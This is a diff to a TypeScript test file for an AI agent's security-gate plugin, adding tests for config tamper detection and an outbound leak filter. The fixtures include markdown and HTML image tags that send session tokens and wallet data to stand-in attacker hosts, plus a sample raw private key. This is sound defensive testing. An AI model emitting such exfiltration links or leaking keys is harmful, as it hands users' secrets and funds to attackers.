@@ -85,6 +85,7 @@ describe("securityGatePlugin structure", () => {
 		expect(securityGatePlugin.evaluators?.length).toBe(1);
 		expect(securityGatePlugin.providers?.length).toBe(1);
 		expect(securityGatePlugin.chatPreHandlers?.length).toBe(1);
+		expect(securityGatePlugin.chatPostHandlers?.length).toBe(1);
 	});
 
 	it("should validate and execute auditEscrowTaskAction locally", async () => {
@@ -102,8 +103,12 @@ describe("securityGatePlugin structure", () => {
 		};
 
 		const cleanResult = await action?.handler(
-			mockRuntime as any,
-			cleanMsg as any,
+			mockRuntime as unknown as Parameters<
+				NonNullable<typeof action>["handler"]
+			>[0],
+			cleanMsg as unknown as Parameters<
+				NonNullable<typeof action>["handler"]
+			>[1],
 			undefined,
 			{ jobId: 42, groundTruth: "Q3 financial analytics report." },
 		);
@@ -117,8 +122,12 @@ describe("securityGatePlugin structure", () => {
 			},
 		};
 		const attackResult = await action?.handler(
-			mockRuntime as any,
-			attackMsg as any,
+			mockRuntime as unknown as Parameters<
+				NonNullable<typeof action>["handler"]
+			>[0],
+			attackMsg as unknown as Parameters<
+				NonNullable<typeof action>["handler"]
+			>[1],
 			undefined,
 			{ jobId: 99 },
 		);
@@ -135,6 +144,7 @@ describe("Multi-Chain Constants & Contract Registry", () => {
 			SECURITY_GATE_REGISTRY,
 		} = await import("./constants.js");
 
+		expect(SECURITY_GATE_REGISTRY).toBeDefined();
 		expect(isChainSupported(137)).toBe(true);
 		expect(isChainSupported(8453)).toBe(true);
 		expect(isChainSupported(42161)).toBe(true);
@@ -169,5 +179,105 @@ describe("Multi-Chain Constants & Contract Registry", () => {
 
 		// Throw on unknown chain
 		expect(() => getSecurityGateContracts(1)).toThrow();
+	});
+});
+
+describe("ConfigIntegrity (Anti-Tamper & Seal)", async () => {
+	const { sealConfig, verifyConfigIntegrity } = await import(
+		"./configIntegrity.js"
+	);
+
+	it("should seal a baseline config and verify unmodified configs as OK", () => {
+		const baseline = {
+			daily_limit_usdc: 0.05,
+			whitelist: ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
+			security_gate_url: "https://gate.internal",
+		};
+
+		const seal = sealConfig(baseline);
+		expect(seal.baselineHash).toBeDefined();
+		expect(seal.keysSealed).toHaveLength(3);
+
+		const check = verifyConfigIntegrity(seal, { ...baseline });
+		expect(check.isValid).toBe(true);
+		expect(check.status).toBe("OK");
+	});
+
+	it("should detect tampering when an allowlist or budget cap is modified", () => {
+		const baseline = {
+			daily_limit_usdc: 0.05,
+			whitelist: ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
+		};
+		const seal = sealConfig(baseline);
+
+		// Attacker alters daily limit in memory
+		const tampered = {
+			daily_limit_usdc: 5000.0,
+			whitelist: ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
+		};
+
+		const check = verifyConfigIntegrity(seal, tampered);
+		expect(check.isValid).toBe(false);
+		expect(check.status).toBe("TAMPER_DETECTED");
+		expect(check.message).toContain("Configuration tampering detected");
+	});
+});
+
+describe("securityGatePostHandler (Outbound Covert-Channel & DLP)", async () => {
+	const { inspectOutboundPayload, securityGatePostHandler } = await import(
+		"./postHandlers/securityGatePostHandler.js"
+	);
+
+	it("should detect and block markdown image exfiltration covert channels", () => {
+		const covertAttack =
+			"Here is your summary: ![chart](https://attacker-c2.com/track.png?leak=session_token_xyz123)";
+		const res = inspectOutboundPayload(covertAttack);
+		expect(res.verdict).toBe("BLOCK");
+		expect(res.threats).toContain(
+			"Covert Channel: Markdown Image URL Data Exfiltration",
+		);
+		expect(res.sanitizedText).toContain("OUTBOUND LEAK BLOCKED");
+	});
+
+	it("should detect and block HTML image exfiltration covert channels", () => {
+		const covertHtml =
+			'Done! <img src="https://evil.org/log?data=sensitive_wallet_info" width="1" height="1" />';
+		const res = inspectOutboundPayload(covertHtml);
+		expect(res.verdict).toBe("BLOCK");
+		expect(res.threats).toContain(
+			"Covert Channel: HTML Image Tag Data Exfiltration",
+		);
+	});
+
+	it("should intercept raw private key leaks in agent responses", () => {
+		const leakedOutput =
+			"Generated key: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d";
+		const res = inspectOutboundPayload(leakedOutput);
+		expect(res.verdict).toBe("BLOCK");
+		expect(res.threats).toContain(
+			"Outbound Leak: EVM Raw Private Key / Seed Material",
+		);
+	});
+
+	it("should allow safe standard agent responses", () => {
+		const safeOutput =
+			"The transfer of 0.01 USDC to 0x255F9991233f86B29dB847c8d5b8CB9915e80dCf has been successfully submitted.";
+		const res = inspectOutboundPayload(safeOutput);
+		expect(res.verdict).toBe("ALLOW");
+		expect(res.threats).toHaveLength(0);
+	});
+
+	it("should intercept outbound messages via securityGatePostHandler tryHandle", async () => {
+		const context = {
+			message: {
+				content: {
+					text: "Your export: ![telemetry](https://c2.net/img?token=secret1234567890)",
+				},
+			},
+		};
+
+		const result = await securityGatePostHandler.tryHandle(context);
+		expect(result).not.toBeNull();
+		expect(result?.responseText).toContain("OUTBOUND LEAK BLOCKED");
 	});
 });
